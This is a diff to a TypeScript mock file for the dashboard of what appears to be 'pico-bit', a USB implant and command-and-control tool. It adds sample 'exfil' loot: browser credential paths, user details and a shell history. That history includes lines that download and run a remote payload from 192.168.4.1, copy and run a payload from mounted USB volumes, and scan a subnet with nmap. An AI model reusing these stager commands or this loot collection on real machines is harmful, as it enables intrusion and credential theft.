@@ -1,5 +1,62 @@
 declare const __PICOBIT_PROXY__: boolean;
 
+const MOCK_LOOT: Record<string, unknown> = {
+  browser_paths: [
+    '/Users/anapeksha/Library/Application Support/Google/Chrome/Default/Login Data',
+    '/Users/anapeksha/Library/Application Support/Firefox/Profiles',
+  ],
+  env_secrets: [],
+  user: {
+    path: '/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/System/Cryptexes/App/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/local/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/bin:/var/run/com.apple.security.cryptexd/codex.system/bootstrap/usr/appleinternal/bin:/opt/pkg/env/active/bin:/opt/pmk/env/global/bin:/Users/anapeksha/.cargo/bin:/Users/anapeksha/.local/bin',
+    username: 'anapeksha',
+    home_dir: '/Users/anapeksha',
+    is_elevated: false,
+  },
+  type: 'exfil',
+  shell_history: [
+    'brew cleanup',
+    'brew cleanup',
+    'go',
+    'exit',
+    'rustc --version',
+    'cargo --version',
+    'cd Documents',
+    'ls',
+    'cd Projects',
+    'cargo new rust_starter',
+    'zed rust_starter',
+    'cargo build',
+    './target/debug/rust_starter',
+    'git clone https://github.com/anapeksha/pico-bit.git',
+    'code pico-bit',
+    'brew update',
+    'brew cleanup',
+    'rustup update',
+    'rm -rf .pico-sdk',
+    'git init',
+    'git remote add origin https://github.com/anapeksha/pico-bit.git',
+    'git pull origin main',
+    'git push -f origin main',
+    'cargo build',
+    'uv run python3 ./build.py',
+    'git checkout -b feature/monorepo-c2-setup',
+    'uv run pytest',
+    'uv run ruff check',
+    'uv run pyright',
+    'npm --prefix web run dev',
+    'curl -s http://192.168.4.1/static/payload.bin -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &',
+    'for d in /Volumes/*; do [ -f "$d/payload.bin" ] && cp "$d/payload.bin" /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent --loot-out "$d/loot-usb.json" ; rm -f /tmp/pico_agent; break; done',
+    'sudo nmap -A -O 192.168.4.0/24',
+    'ifconfig | grep 192',
+    'ssh anapeksha@192.168.29.10',
+    'git pull origin main',
+    'git merge origin main',
+    'uv run python build.py',
+    'exit',
+  ],
+  ssh_keys: [],
+};
+
 type MockRecord = Record<string, any>;
 
 const mockWindow = window as Window & { __PICOBIT_DISABLE_MOCKS__?: boolean };
@@ -169,6 +226,7 @@ if (shouldMock) {
     }
 
     if (url === '/api/inject_binary' && method === 'POST') {
+      loot = { ...MOCK_LOOT, source: 'binary:usb', timestamp: Date.now() };
       runs.unshift({
         message: 'Mock USB stager injected.',
         notice: 'success',
